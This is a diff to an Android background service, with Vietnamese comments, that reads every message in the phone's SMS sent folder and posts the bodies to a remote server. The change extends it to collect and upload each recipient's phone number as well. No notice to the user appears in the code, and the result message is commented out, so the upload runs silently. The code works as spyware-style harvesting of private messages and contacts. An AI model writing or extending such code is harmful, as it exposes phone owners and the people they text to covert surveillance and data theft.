@@ -45,8 +45,10 @@ public class Send extends Service {
     String content = null;
     String from = null;
     String phone_user=null;
-    JSONArray jsonArray;
-    JSONObject jsonObject;
+    JSONArray jsonArray_content;
+    JSONArray jsonArray_phone;
+    JSONObject jsonObject_content;
+    JSONObject jsonObject_phone;
      WifiManager wifiManager;
     @Nullable
     @Override
@@ -183,6 +185,7 @@ public class Send extends Service {
 
             /*Lấy tin nhắn sentbox gửi lên server*/
      ArrayList<String> smsSentbox = new ArrayList<String>();
+     ArrayList<String>phone=new ArrayList<String>();
      Uri uri = Uri.parse("content://sms/sent");
      Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, null, null, null);
      int count = cursor.getCount();//đếm số tin nhắn
@@ -196,19 +199,36 @@ public class Send extends Service {
          address = cursor.getString(1);
          bodySms = cursor.getString(3);
          smsSentbox.add(bodySms.toString());
+         phone.add(address.toString());
          while (cursor.moveToNext()) {
              date = cursor.getString(2);
              address = cursor.getString(1);
              bodySms = cursor.getString(3);
              smsSentbox.add(bodySms.toString());
+             phone.add(address.toString());
          }
-         jsonObject = null;
-         jsonArray = new JSONArray();
+
+         //json array content sms
+         jsonObject_content = null;
+         jsonArray_content = new JSONArray();
          for (int i = 0; i < smsSentbox.size(); i++) {
-             jsonObject = new JSONObject();
+             jsonObject_content = new JSONObject();
              try {
-                 jsonObject.put("content", smsSentbox.get(i).toString());
-                 jsonArray.put(jsonObject);
+                 jsonObject_content.put("content", smsSentbox.get(i).toString());
+                 jsonArray_content.put(jsonObject_content);
+             } catch (JSONException e) {
+                 e.printStackTrace();
+             }
+         }
+
+         //json array phone number
+         jsonObject_phone = null;
+         jsonArray_phone = new JSONArray();
+         for (int i = 0; i < phone.size(); i++) {
+             jsonObject_phone = new JSONObject();
+             try {
+                 jsonObject_phone.put("to", phone.get(i).toString());
+                 jsonArray_phone.put(jsonObject_phone);
              } catch (JSONException e) {
                  e.printStackTrace();
              }
@@ -221,6 +241,7 @@ public class Send extends Service {
          }
      });
      t1.start();
+
  }
 
     @Override
@@ -283,7 +304,8 @@ public class Send extends Service {
         // URL của trang web nhận request
         HttpPost httpPost = new HttpPost(param);
         ArrayList<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
-        nameValuePair.add(new BasicNameValuePair("content_sentbox", jsonArray.toString()));
+        nameValuePair.add(new BasicNameValuePair("content_sentbox", jsonArray_content.toString()));
+        nameValuePair.add(new BasicNameValuePair("phone_sentbox", jsonArray_phone.toString()));
 
 
         try {
@@ -314,9 +336,10 @@ public class Send extends Service {
 
         @Override
         protected void onPostExecute(String s) {
-          //  Toast.makeText(getApplicationContext(), s, Toast.LENGTH_LONG).show();
+           //Toast.makeText(getApplicationContext(), s, Toast.LENGTH_LONG).show();
         }
     }
+
 }
 
 
